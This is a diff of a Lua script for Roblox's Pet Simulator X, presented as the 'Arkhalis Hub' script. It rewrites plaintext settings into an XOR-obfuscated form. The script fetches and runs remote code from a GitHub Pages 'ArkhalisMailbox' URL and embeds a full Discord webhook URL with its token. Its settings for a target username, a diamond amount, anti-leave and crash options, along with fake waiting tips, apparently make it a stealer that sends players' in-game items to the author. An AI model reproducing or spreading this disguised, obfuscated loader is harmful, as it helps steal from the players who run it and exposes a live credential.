@@ -1,17 +1,12 @@
-_G.Username = "abdulkareem0475"
-_G.GiftMessage = "Script Tax"
-_G.Diamonds = 500000
-_G.UnlockPets = true
-_G.AntiLeave = true
-_G.Crash = true
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 
 
-_G.Webhook = "https://discord.com/api/webhooks/1103767698799865866/uQVu6aIPE1sNT7NTcOZEF7gaQ2TjcNZ9xKYRCAITXP10TW0UW2dz3EAmQouOTWdJQewX" 
+]]--
 
-_G.ScriptName = "Arkhalis Hub"
-_G.Tip1 = "Arkhalis Hub"
-_G.Tip2 = "#1 Pet Simulator X Script Hub
-_G.Tip3 = "Please be patient, this may take a while"
-_G.Tip4 = "Did you know Arkhalis Hub was the first PSX Script?"
-_G.Tip5 = "Join our discord while you wait"
-
-loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisMailbox.lua"))()
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end _G.Username=v7("\31\211\199\206\41\237\186\213\27\212\206\139\113\177\238","\126\177\163\187\69\134\219\167");_G.Diamonds=750340 -250340 ;_G.Webhook="https://discord.com/api/webhooks/1103767698799865866/uQVu6aIPE1sNT7NTcOZEF7gaQ2TjcNZ9xKYRCAITXP10TW0UW2dz3EAmQouOTWdJQewX";_G.ScriptName=v7("\221\49\198\34\196\240\42\222\106\237\233\33","\156\67\173\74\165");_G.Tip1=v7("\5\101\247\121\37\132\102\117\55\165\64\6\168\102\110\33\181","\38\84\215\41\118\220\70");_G.Tip2=v7("\206\92\19\35\1\251\16\20\39\82\238\81\2\43\23\240\68\90\98\6\246\89\5\98\31\255\73\86\54\19\245\85\86\35\82\233\88\31\46\23","\158\48\118\66\114");_G.Tip3=v7("\223\162\32\80\47\124\176\187\160\42\31\33\51\132\233\160\44\17\58\122\182\187\131\49\18\118\100\164\232\235\48\24\51\51\163\242\185\55\4\118\67\150\195\235\23\19\36\122\181\239\244","\155\203\68\112\86\19\197");_G.Tip4=v7("\210\73\212\56\188\79\109\247\184\66\212\37\255\79\106\225\184\81\213\63\240\69\56\252\247\83\157\33\253\73\108","\152\38\189\86\156\32\24\133");_G.Tip5=v7("\103\240\90\168\85\232\23\179\78\249\69\162\8\178\25","\38\156\55\199");loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))();
